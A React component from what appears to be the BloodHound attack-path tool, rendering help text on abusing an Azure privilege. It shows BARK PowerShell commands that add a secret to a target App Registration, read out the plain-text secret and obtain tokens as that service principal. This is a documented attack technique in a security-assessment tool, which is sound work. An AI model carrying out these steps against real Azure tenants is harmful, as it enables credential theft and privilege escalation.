// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { FC } from 'react';
import { Typography } from '@mui/material';

const Abuse: FC = () => {
    return (
        <>
            <Typography variant='body2'>
                There are several ways to perform this abuse, depending on what sort of access you have to the
                credentials of the object that holds this privilege against the target object. If you have an
                interactive web browser session for the Azure portal, it is as simple as finding the target App in the
                portal and adding a new secret to the object using the “Certificates & secrets” tab. Service Principals
                do not have this tab in the Azure portal but you can add secrets to them with the MS Graph API.
            </Typography>

            <Typography variant='body2'>
                No matter what kind of control you have, you will be able to perform this abuse by using BARK’s
                New-AppRegSecret or New-ServicePrincipalSecret functions.
            </Typography>

            <Typography variant='body2'>
                These functions require you to supply an MS Graph-scoped JWT associated with the Service Principal that
                has the privilege to add secrets to the target object. There are several ways to acquire a JWT. For
                example, you may use BARK’s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by
                supplying a Service Principal Client ID and secret:
            </Typography>

            <Typography component={'pre'}>
                {`$MGToken = Get-MSGraphTokenWithClientCredentials
    -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c"
    -ClientSecret "asdf..."
    -TenantName "contoso.onmicrosoft.com"`}
            </Typography>

            <Typography variant='body2'>
                Then use BARK’s New-AppRegSecret to add a new secret to the target application:
            </Typography>

            <Typography component={'pre'}>
                {`New-AppRegSecret \`
    -AppRegObjectID "d878…" \`
    -Token $MGToken.access_token`}
            </Typography>

            <Typography variant='body2'>
                The output will contain the plain-text secret you just created for the target app:
            </Typography>

            <Typography component={'pre'}>
                {`New-AppRegSecret \`
-AppRegObjectID "d878…" \`
-Token $MGToken.access_token

Name                Value
-----------------------------
AppRegSecretValue   odg8Q~...
AppRegAppId         4d31…
AppRegObjectId      d878…`}
            </Typography>

            <Typography variant='body2'>
                With this plain text secret, you can now acquire tokens as the service principal associated with the
                app. You can easily do this with BARK’s Get-MSGraphToken function:
            </Typography>

            <Typography component={'pre'}>
                {`$SPToken = Get-MSGraphToken \`
    -ClientID "4d31…" \`
    -ClientSecret "odg8Q~..." \`
    -TenantName "contoso.onmicrosoft.com"`}
            </Typography>

            <Typography variant='body2'>
                Now you can use this JWT to perform actions against any other MS Graph endpoint as the service
                principal, continuing your attack path with the privileges of that service principal.
            </Typography>
        </>
    );
};

export default Abuse;
